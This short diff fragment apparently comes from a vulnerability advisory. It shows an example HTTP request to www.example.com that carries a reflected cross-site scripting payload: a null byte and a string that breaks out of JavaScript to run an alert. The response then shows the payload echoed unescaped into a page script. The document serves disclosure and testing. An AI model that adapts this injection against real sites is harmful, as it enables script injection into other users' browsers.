@@ -1,0 +1,1 @@
+Example 1 Request: +----------------- GET /?%00";};alert(String.fromCharCode(120,115,115,116,101,115,116 ));{//=1 HTTP/1.1 Host: www.example.com Referer: http://www.example.com/about --- Example 1 Response: +------------------ --- SNIP --- function refresh_page(){ parent.location="/?%00";};alert(String.fromCharCode(120,115,115 ,116,101,115,116));{//=1"; 
